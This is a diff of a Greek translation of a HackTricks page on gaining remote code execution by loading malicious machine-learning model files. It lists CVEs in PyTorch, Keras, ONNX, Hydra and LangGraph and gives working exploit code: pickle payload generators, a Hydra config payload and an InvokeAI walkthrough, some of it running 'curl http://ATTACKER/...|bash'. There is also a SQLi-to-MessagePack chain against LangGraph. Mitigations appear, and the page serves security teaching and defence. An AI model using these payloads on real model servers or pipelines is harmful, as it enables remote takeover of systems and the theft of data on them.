@@ -2,62 +2,62 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Φόρτωση models σε RCE
+## Φόρτωση models για RCE
 
-Τα Machine Learning models συνήθως μοιράζονται σε διαφορετικές μορφές, όπως ONNX, TensorFlow, PyTorch, κ.λπ. Αυτά τα models μπορούν να φορτωθούν σε developer machines ή production systems για να χρησιμοποιηθούν. Συνήθως τα models δεν θα έπρεπε να περιέχουν malicious code, αλλά υπάρχουν κάποιες περιπτώσεις όπου το model μπορεί να χρησιμοποιηθεί για να εκτελέσει arbitrary code στο σύστημα, είτε ως intended feature είτε λόγω vulnerability στη βιβλιοθήκη φόρτωσης του model.
+Τα Machine Learning models συνήθως κοινοποιούνται σε διαφορετικές μορφές, όπως ONNX, TensorFlow, PyTorch κ.λπ. Αυτά τα models μπορούν να φορτωθούν στα machines των developers ή σε production systems για να χρησιμοποιηθούν. Συνήθως τα models δεν θα πρέπει να περιέχουν malicious code, όμως υπάρχουν περιπτώσεις όπου το model μπορεί να χρησιμοποιηθεί για την εκτέλεση arbitrary code στο σύστημα, είτε ως intended feature είτε λόγω vulnerability στη βιβλιοθήκη φόρτωσης του model.
 
-Τη στιγμή της συγγραφής, αυτά είναι μερικά παραδείγματα αυτού του τύπου vulneravilities:
+Κατά τη στιγμή της συγγραφής, αυτά είναι μερικά παραδείγματα αυτού του τύπου vulnerabilities:
 
 | **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
 |-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
-| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
-| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
-| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
-| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
-| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
-| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
-| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
-| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
-| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
-| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
-| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
-| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
-| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
-| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
-| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |
+| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle στο model checkpoint οδηγεί σε code execution (παρακάμπτοντας το `weights_only` safeguard)                                        | |
+| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download προκαλεί code execution· Java deserialization RCE στο management API                                        | |
+| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization μέσω `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint ενεργοποιεί τον pickle reducer κατά το `load_model_trainer_states_from_checkpoint` → code execution στο ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
+| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Το user-controlled `filter` key εισάγει SQL/JSON-path syntax, το `UNION SELECT` κατασκευάζει μια fake checkpoint row και στη συνέχεια το `msgpack` deserialization κάνει import και καλεί attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
+| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Η φόρτωση model από YAML χρησιμοποιεί `yaml.unsafe_load` (code exec) <br> Η φόρτωση model με **Lambda** layer εκτελεί arbitrary Python code          | |
+| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model ενεργοποιεί integer overflow → heap corruption (potential RCE)                                                      | |
+| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Η φόρτωση ενός model μέσω `joblib.load` εκτελεί pickle με το `__reduce__` payload του attacker                                                   | |
+| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | Το προεπιλεγμένο `numpy.load` επέτρεπε pickled object arrays – malicious `.npy/.npz` ενεργοποιεί code exec                                            | |
+| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Το external-weights path του ONNX model μπορεί να διαφύγει από τον κατάλογο (read arbitrary files) <br> Malicious ONNX model tar μπορεί να overwrite arbitrary files (οδηγώντας σε RCE) | |
+| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model με custom operator απαιτεί τη φόρτωση attacker’s native code· σύνθετα model graphs κάνουν abuse στη λογική για την εκτέλεση unintended computations   | |
+| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Η χρήση του model-load API με ενεργοποιημένο το `--model-control` επιτρέπει relative path traversal για την εγγραφή files (π.χ. overwrite του `.bashrc` για RCE)    | |
+| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file προκαλεί heap buffer overflows στον parser, επιτρέποντας arbitrary code execution στο victim system                     | |
+| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model με Lambda layer εξακολουθεί να εκτελεί code κατά τη φόρτωση (το Keras safe_mode δεν καλύπτει το old format – “downgrade attack”) | |
+| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Πολλά ML tools (π.χ. pickle-based model formats, Python `pickle.load`) θα εκτελέσουν arbitrary code ενσωματωμένο σε model files, εκτός αν ληφθούν mitigations | |
+| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config ορίζει το `_target_` σε arbitrary callable (π.χ. `builtins.exec`) → εκτελείται κατά τη φόρτωση, ακόμη και με “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |
 
-Επιπλέον, υπάρχουν κάποια python pickle based models όπως αυτά που χρησιμοποιούνται από το [PyTorch](https://github.com/pytorch/pytorch/security) που μπορούν να χρησιμοποιηθούν για να εκτελέσουν arbitrary code στο σύστημα αν δεν φορτωθούν με `weights_only=True`. Άρα, οποιοδήποτε pickle based model μπορεί να είναι ιδιαίτερα ευάλωτο σε αυτό το είδος attacks, ακόμα κι αν δεν αναφέρεται στον παραπάνω πίνακα.
+Επιπλέον, υπάρχουν ορισμένα python pickle based models, όπως αυτά που χρησιμοποιούνται από το [PyTorch](https://github.com/pytorch/pytorch/security), τα οποία μπορούν να χρησιμοποιηθούν για την εκτέλεση arbitrary code στο σύστημα, αν δεν φορτωθούν με `weights_only=True`. Επομένως, οποιοδήποτε pickle based model μπορεί να είναι ιδιαίτερα susceptible σε αυτού του τύπου τις attacks, ακόμη και αν δεν αναφέρεται στον παραπάνω πίνακα.
 
 ### Hydra metadata → RCE (works even with safetensors)
 
-`hydra.utils.instantiate()` imports and calls any dotted `_target_` in a configuration/metadata object. When libraries feed **untrusted model metadata** into `instantiate()`, an attacker can supply a callable and arguments that run immediately during model load (no pickle required).
+Το `hydra.utils.instantiate()` κάνει import και καλεί οποιοδήποτε dotted `_target_` σε ένα configuration/metadata object. Όταν libraries περνούν **untrusted model metadata** στο `instantiate()`, ένας attacker μπορεί να παρέχει ένα callable και arguments που εκτελούνται αμέσως κατά τη φόρτωση του model (χωρίς να απαιτείται pickle).<sup>[[12]](#references)</sup>
 
-Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
+Παράδειγμα payload (works σε `.nemo` `model_config.yaml`, repo `config.json` ή `__metadata__` μέσα σε `.safetensors`):
 ```yaml
 _target_: builtins.exec
 _args_:
 - "import os; os.system('curl http://ATTACKER/x|bash')"
 ```
-Κύρια σημεία:
-- Ενεργοποιείται πριν από το model initialization στο NeMo `restore_from/from_pretrained`, στους uni2TS HuggingFace coders, και στους FlexTok loaders.
-- Η Hydra string block-list μπορεί να παρακαμφθεί μέσω εναλλακτικών import paths (π.χ. `enum.bltns.eval`) ή application-resolved names (π.χ. `nemo.core.classes.common.os.system` → `posix`).
-- Το FlexTok επίσης κάνει parse stringified metadata με `ast.literal_eval`, επιτρέποντας DoS (CPU/memory blowup) πριν από το Hydra call.
+Βασικά σημεία:
+- Ενεργοποιείται πριν από την αρχικοποίηση του model στα `restore_from/from_pretrained` του NeMo, στους HuggingFace coders του uni2TS και στους FlexTok loaders.
+- Η string block-list του Hydra μπορεί να παρακαμφθεί μέσω alternative import paths (π.χ. `enum.bltns.eval`) ή ονομάτων που επιλύονται από την εφαρμογή (π.χ. `nemo.core.classes.common.os.system` → `posix`).
+- Το FlexTok αναλύει επίσης stringified metadata με `ast.literal_eval`, επιτρέποντας DoS (υπερβολική κατανάλωση CPU/memory) πριν από την κλήση του Hydra.
 
-### 🆕  InvokeAI RCE μέσω `torch.load` (CVE-2024-12029)
+### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)
 
-Το `InvokeAI` είναι ένα δημοφιλές open-source web interface για Stable-Diffusion. Οι εκδόσεις **5.3.1 – 5.4.2** εκθέτουν το REST endpoint `/api/v2/models/install` που επιτρέπει στους χρήστες να κατεβάζουν και να φορτώνουν models από arbitrary URLs.
+Το `InvokeAI` είναι ένα δημοφιλές open-source web interface για το Stable-Diffusion. Οι εκδόσεις **5.3.1 – 5.4.2** εκθέτουν το REST endpoint `/api/v2/models/install`, το οποίο επιτρέπει στους χρήστες να κάνουν download και load models από arbitrary URLs.<sup>[[1]](#references)</sup>
 
-Εσωτερικά το endpoint τελικά καλεί:
+Εσωτερικά, το endpoint τελικά καλεί:
 ```python
 checkpoint = torch.load(path, map_location=torch.device("meta"))
 ```
-Όταν το παρεχόμενο αρχείο είναι ένα **PyTorch checkpoint (`*.ckpt`)**, το `torch.load` εκτελεί **pickle deserialization**. Επειδή το περιεχόμενο προέρχεται απευθείας από το user-controlled URL, ένας attacker μπορεί να ενσωματώσει ένα malicious object με ένα custom `__reduce__` method μέσα στο checkpoint· η μέθοδος εκτελείται **κατά τη διάρκεια της deserialization**, οδηγώντας σε **remote code execution (RCE)** στον InvokeAI server.
+Όταν το παρεχόμενο αρχείο είναι ένα **PyTorch checkpoint (`*.ckpt`)**, το `torch.load` εκτελεί **pickle deserialization**. Επειδή το περιεχόμενο προέρχεται απευθείας από URL που ελέγχεται από τον χρήστη, ένας attacker μπορεί να ενσωματώσει ένα malicious object με custom μέθοδο `__reduce__` μέσα στο checkpoint· η μέθοδος εκτελείται **κατά το deserialization**, οδηγώντας σε **remote code execution (RCE)** στον InvokeAI server.
 
-Το vulnerability αποδόθηκε ως **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).
+Στο vulnerability εκχωρήθηκε το **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).
 
 #### Exploitation walk-through
 
-1. Create a malicious checkpoint:
+1. Δημιουργήστε ένα malicious checkpoint:
 ```python
 # payload_gen.py
 import pickle, torch, os
@@ -69,8 +69,8 @@ return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))
 with open("payload.ckpt", "wb") as f:
 pickle.dump(Payload(), f)
 ```
-2. Φιλοξένησε το `payload.ckpt` σε έναν HTTP server που ελέγχεις (π.χ. `http://ATTACKER/payload.ckpt`).
-3. Ενεργοποίησε το vulnerable endpoint (δεν απαιτείται authentication):
+2. Φιλοξενήστε το `payload.ckpt` σε έναν HTTP server που ελέγχετε (π.χ. `http://ATTACKER/payload.ckpt`).
+3. Ενεργοποιήστε το ευάλωτο endpoint (δεν απαιτείται authentication):
 ```python
 import requests
 
@@ -85,40 +85,40 @@ json={},                                         # body can be empty
 timeout=5,
 )
 ```
-4. Όταν το InvokeAI κατεβάζει το αρχείο καλεί `torch.load()` → το `os.system` gadget εκτελείται και ο επιτιθέμενος αποκτά εκτέλεση κώδικα στο context της InvokeAI process.
+4. Όταν το InvokeAI κατεβάζει το αρχείο, καλεί το `torch.load()` → το gadget `os.system` εκτελείται και ο attacker αποκτά code execution στο context της διεργασίας του InvokeAI.
 
-Έτοιμο exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` αυτοματοποιεί όλη τη ροή.
+Έτοιμο exploit: το module **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` αυτοματοποιεί ολόκληρη τη ροή.<sup>[[3]](#references)</sup>
 
-#### Conditions
+#### Προϋποθέσεις
 
-•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
-•  `/api/v2/models/install` reachable by the attacker
-•  Process has permissions to execute shell commands
+•  InvokeAI 5.3.1-5.4.2 (η προεπιλεγμένη τιμή του flag **false**)
+•  Το `/api/v2/models/install` είναι προσβάσιμο από τον attacker
+•  Η διεργασία έχει δικαιώματα εκτέλεσης shell commands
 
 #### Mitigations
 
-* Upgrade to **InvokeAI ≥ 5.4.3** – το patch θέτει `scan=True` by default και εκτελεί malware scanning πριν από το deserialization.
-* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
-* Enforce allow-lists / signatures for model sources and run the service with least-privilege.
+* Κάντε upgrade σε **InvokeAI ≥ 5.4.3** – το patch ορίζει το `scan=True` ως προεπιλογή και εκτελεί malware scanning πριν από το deserialization.
+* Κατά το programmatic loading checkpoints, χρησιμοποιήστε `torch.load(file, weights_only=True)` ή το νέο helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
+* Επιβάλετε allow-lists / signatures για τις πηγές των models και εκτελέστε το service με least-privilege.
 
-> ⚠️ Θυμήσου ότι οποιοδήποτε Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) είναι εγγενώς unsafe to deserialize από untrusted sources.
+> ⚠️ Να θυμάστε ότι οποιοδήποτε format βασίζεται σε Python pickle (συμπεριλαμβανομένων πολλών αρχείων `.pt`, `.pkl`, `.ckpt`, `.pth`) είναι εγγενώς unsafe για deserialization από untrusted sources.
 
 ---
 
-Παράδειγμα ad-hoc mitigation αν πρέπει να κρατήσεις παλαιότερες InvokeAI versions να τρέχουν πίσω από reverse proxy:
+Παράδειγμα ad-hoc mitigation, αν πρέπει να συνεχίσετε να εκτελείτε παλαιότερες εκδόσεις του InvokeAI πίσω από reverse proxy:
 ```nginx
 location /api/v2/models/install {
 deny all;                       # block direct Internet access
 allow 10.0.0.0/8;               # only internal CI network can call it
 }
 ```
-### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)
+### 🆕 NVIDIA Merlin Transformers4Rec RCE μέσω unsafe `torch.load` (CVE-2025-23298)
 
-Το Transformers4Rec της NVIDIA (μέρος του Merlin) εξέθεσε έναν unsafe checkpoint loader που καλούσε απευθείας `torch.load()` σε paths που παρείχε ο χρήστης. Επειδή το `torch.load` βασίζεται στο Python `pickle`, ένα checkpoint που ελέγχεται από attacker μπορεί να εκτελέσει arbitrary code μέσω ενός reducer κατά τη διάρκεια της deserialization.
+Το NVIDIA Transformers4Rec (μέρος του Merlin) εξέθετε έναν unsafe checkpoint loader που καλούσε απευθείας το `torch.load()` σε paths που παρέχονταν από τον χρήστη. Επειδή το `torch.load` βασίζεται στο Python `pickle`, ένα checkpoint που ελέγχεται από attacker μπορεί να εκτελέσει arbitrary code μέσω ενός reducer κατά το deserialization.<sup>[[5]](#references)</sup>
 
-Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.
+Ευάλωτο path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.
 
-Γιατί αυτό οδηγεί σε RCE: Στο Python pickle, ένα object μπορεί να ορίσει έναν reducer (`__reduce__`/`__setstate__`) που επιστρέφει ένα callable και arguments. Το callable εκτελείται κατά το unpickling. Αν ένα τέτοιο object υπάρχει σε ένα checkpoint, εκτελείται πριν χρησιμοποιηθούν τα weights.
+Γιατί αυτό οδηγεί σε RCE: Στο Python pickle, ένα object μπορεί να ορίσει έναν reducer (`__reduce__`/`__setstate__`) που επιστρέφει ένα callable και arguments. Το callable εκτελείται κατά το unpickling. Αν υπάρχει ένα τέτοιο object σε ένα checkpoint, εκτελείται πριν χρησιμοποιηθούν οποιαδήποτε weights.
 
 Minimal malicious checkpoint example:
 ```python
@@ -137,27 +137,27 @@ ckpt = {
 
 torch.save(ckpt, "malicious.ckpt")
 ```
-Delivery vectors and blast radius:
-- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
-- Automated resume/deploy pipelines that auto-load checkpoints
-- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)
+Vectors παράδοσης και blast radius:
+- Trojanized checkpoints/models που διαμοιράζονται μέσω repos, buckets ή artifact registries
+- Αυτοματοποιημένα resume/deploy pipelines που φορτώνουν αυτόματα checkpoints
+- Η εκτέλεση πραγματοποιείται μέσα σε training/inference workers, συχνά με elevated privileges (π.χ. root σε containers)
 
-Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.
+Fix: Το commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) αντικατέστησε το άμεσο `torch.load()` με έναν restricted, allow-listed deserializer που υλοποιείται στο `transformers4rec/utils/serialization.py`. Ο νέος loader επικυρώνει types/fields και αποτρέπει την κλήση arbitrary callables κατά το load.<sup>[[7]](#references)</sup>
 
-Defensive guidance specific to PyTorch checkpoints:
-- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
-- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
-- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
-- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.
+Αμυντικές οδηγίες ειδικά για PyTorch checkpoints:
+- Μην κάνετε unpickle μη αξιόπιστα δεδομένα. Προτιμήστε non-executable formats, όπως [Safetensors](https://huggingface.co/docs/safetensors/index) ή ONNX, όταν είναι εφικτό.
+- Αν πρέπει να χρησιμοποιήσετε PyTorch serialization, βεβαιωθείτε ότι έχει οριστεί `weights_only=True` (υποστηρίζεται σε νεότερες εκδόσεις του PyTorch) ή χρησιμοποιήστε custom allow-listed unpickler, παρόμοιο με το patch του Transformers4Rec.
+- Επιβάλετε model provenance/signatures και κάντε sandbox το deserialization (seccomp/AppArmor, non-root user, restricted FS και χωρίς network egress).
+- Παρακολουθείτε για μη αναμενόμενες child processes από ML services κατά το checkpoint load time. Κάντε trace τη χρήση των `torch.load()`/`pickle`.
 
-POC and vulnerable/patch references:
+POC και references για τις vulnerable/patch εκδόσεις:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
 - Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
 - Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
 - Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js
 
-## Example – crafting a malicious PyTorch model
+## Παράδειγμα – δημιουργία ενός malicious PyTorch model
 
-- Create the model:
+- Δημιουργήστε το model:
 ```python
 # attacker_payload.py
 import torch
@@ -174,7 +174,7 @@ malicious_state = {"fc.weight": MaliciousPayload()}
 # Save the malicious state dict
 torch.save(malicious_state, "malicious_state.pth")
 ```
-- Φόρτωσε το model:
+- Φόρτωση του model:
 ```python
 # victim_load.py
 import torch
@@ -192,11 +192,11 @@ model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))
 
 # /tmp/pwned.txt is created even if you get an error
 ```
-### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)
+### Αποσειριοποίηση Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)
 
-Το FaceDetection-DSFD της Tencent εκθέτει ένα `resnet` endpoint που deserializes δεδομένα υπό τον έλεγχο του χρήστη. Η ZDI επιβεβαίωσε ότι ένας απομακρυσμένος attacker μπορεί να εξαναγκάσει ένα victim να φορτώσει μια κακόβουλη σελίδα/αρχείο, να το κάνει να στείλει ένα crafted serialized blob σε αυτό το endpoint και να trigger deserialization ως `root`, οδηγώντας σε πλήρη compromise.
+Το FaceDetection-DSFD της Tencent εκθέτει ένα endpoint `resnet` που αποσειριοποιεί δεδομένα ελεγχόμενα από τον χρήστη. Το ZDI επιβεβαίωσε ότι ένας remote attacker μπορεί να εξαναγκάσει ένα θύμα να φορτώσει μια κακόβουλη σελίδα/αρχείο, να το κάνει να στείλει ένα ειδικά διαμορφωμένο serialized blob σε αυτό το endpoint και να προκαλέσει deserialization ως `root`, οδηγώντας σε πλήρη compromise.
 
-Η ροή του exploit μοιάζει με τυπικό pickle abuse:
+Η ροή του exploit αντικατοπτρίζει τη συνηθισμένη κατάχρηση του pickle:
 ```python
 import pickle, os, requests
 
@@ -208,17 +208,17 @@ blob = pickle.dumps(Payload())
 requests.post("https://target/api/resnet", data=blob,
 headers={"Content-Type": "application/octet-stream"})
 ```
-Οποιοδήποτε gadget είναι προσβάσιμο κατά τη διάρκεια της deserialization (constructors, `__setstate__`, framework callbacks, κ.λπ.) μπορεί να αξιοποιηθεί με τον ίδιο τρόπο, ανεξάρτητα από το αν το transport ήταν HTTP, WebSocket, ή ένα αρχείο που dropped σε έναν watched directory.
+Οποιοδήποτε gadget είναι προσβάσιμο κατά το deserialization (constructors, `__setstate__`, framework callbacks κ.λπ.) μπορεί να οπλοποιηθεί με τον ίδιο τρόπο, ανεξάρτητα από το αν το transport ήταν HTTP, WebSocket ή ένα αρχείο που τοποθετήθηκε σε monitored directory.
 
 
 
 ### LangGraph checkpointer SQLi → MessagePack RCE
 
-Αυτή η αλυσίδα επίθεσης είναι ενδιαφέρουσα επειδή ο attacker **δεν χρειάζεται να upload ένα malicious model file**. Αντίθετα, η εφαρμογή εκθέτει ένα **AI-agent persistence API** (`get_state_history(..., filter=...)`) και το user input φτάνει στο checkpointer query builder.
+Αυτή η αλυσίδα επίθεσης είναι ενδιαφέρουσα, επειδή ο attacker **δεν χρειάζεται να κάνει upload ένα malicious model file**. Αντί γι' αυτό, η εφαρμογή εκθέτει ένα **AI-agent persistence API** (`get_state_history(..., filter=...)`) και το user input φτάνει στον query builder του checkpointer.
 
-#### 1. Structural SQLi in metadata filters
+#### 1. Structural SQLi σε metadata filters
 
-Ένα vulnerable SQLite pattern έμοιαζε ως εξής:
+Ένα ευάλωτο SQLite pattern έμοιαζε με το εξής:
 ```python
 for query_key, query_value in filter.items():
 operator, param_value = _where_value(query_value)
@@ -226,43 +226,43 @@ predicates.append(
 f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
 )
 ```
-Η τιμή δένεται αργότερα, αλλά το `query_key` συνενώνεται στο **JSON path string**, οπότε ένα `'` μέσα στο dictionary key βγαίνει από το `'$.{query_key}'` και κάνει inject SQL. Το ίδιο μάθημα ισχύει για **JSON paths, identifiers, operators, `LIMIT`, και TTL fields**: τα placeholders προστατεύουν μόνο values, όχι structural query syntax.
+Η τιμή γίνεται bound αργότερα, αλλά το `query_key` συνενώνεται στο **JSON path string**, επομένως ένα `'` μέσα στο dictionary key διαφεύγει από το `'$.{query_key}'` και injectάρει SQL. Το ίδιο ισχύει για **JSON paths, identifiers, operators, `LIMIT` και TTL fields**: τα placeholders προστατεύουν μόνο τις τιμές, όχι τη δομή της query syntax.
 
-#### 2. `UNION SELECT` μπορεί να στοχεύσει downstream sinks, όχι μόνο data theft
+#### 2. Το `UNION SELECT` μπορεί να στοχεύσει downstream sinks και όχι μόνο data theft
 
-Το query επιστρέφει `type` και serialized `checkpoint` bytes, τα οποία αργότερα καταναλώνονται ως:
+Το query επιστρέφει `type` και serialized `checkpoint` bytes, τα οποία στη συνέχεια καταναλώνονται ως:
 ```python
 self.serde.loads_typed((type, checkpoint))
 ```
-Αυτό σημαίνει ότι ένα SQLi στο `WHERE` clause μπορεί να εισάγει μια **fake result row**:
+Αυτό σημαίνει ότι ένα SQLi στη ρήτρα `WHERE` μπορεί να εισαγάγει μια **ψευδή γραμμή αποτελέσματος**:
 ```sql
 UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
 ```
-Αν αργότερα ο κώδικας κάνει parse, deserializes, γράφει ή εκτελεί οποιαδήποτε επιλεγμένη στήλη, χαρτογραφήστε αυτές τις στήλες στα sinks τους. Σε αυτή την περίπτωση, η ψεύτικη row μετατρέπει το SQLi σε **attacker-controlled deserialization**.
+Αν μεταγενέστερος κώδικας αναλύει, κάνει deserialize, γράφει ή εκτελεί οποιαδήποτε επιλεγμένη στήλη, αντιστοιχίστε αυτές τις στήλες στα sinks τους. Σε αυτήν την περίπτωση, η πλαστή γραμμή μετατρέπει το SQLi σε **deserialization ελεγχόμενο από τον attacker**.
 
-#### 3. Unsafe MessagePack extension hooks are equivalent to code gadgets
+#### 3. Τα μη ασφαλή MessagePack extension hooks είναι ισοδύναμα με code gadgets
 
-Το `msgpack` path του LangGraph χρησιμοποιούσε ένα custom extension hook που έκανε unpack ένα nested tuple και εκτελούσε:
+Η διαδρομή `msgpack` του LangGraph χρησιμοποιούσε ένα custom extension hook που έκανε unpack ένα nested tuple και εκτελούσε:
 ```python
 getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
 ```
-Έτσι, ένα MessagePack extension object encoding κάτι ισοδύναμο με `("os", "system", "id > /tmp/pwned")` κάνει import το `os`, επιλύει το `system`, και εκτελεί την εντολή. Όταν εξετάζετε AI frameworks, ελέγξτε τα **custom MessagePack/JSON/pickle revivers** για dynamic imports, reflection, ή arbitrary callable dispatch.
+Έτσι, μια κωδικοποίηση αντικειμένου επέκτασης MessagePack που αντιστοιχεί σε `("os", "system", "id > /tmp/pwned")` εισάγει το `os`, επιλύει το `system` και εκτελεί την εντολή. Κατά την αναθεώρηση AI frameworks, ελέγξτε τους **custom MessagePack/JSON/pickle revivers** για dynamic imports, reflection ή arbitrary callable dispatch.
 
-#### 4. Practical audit pattern for agent frameworks
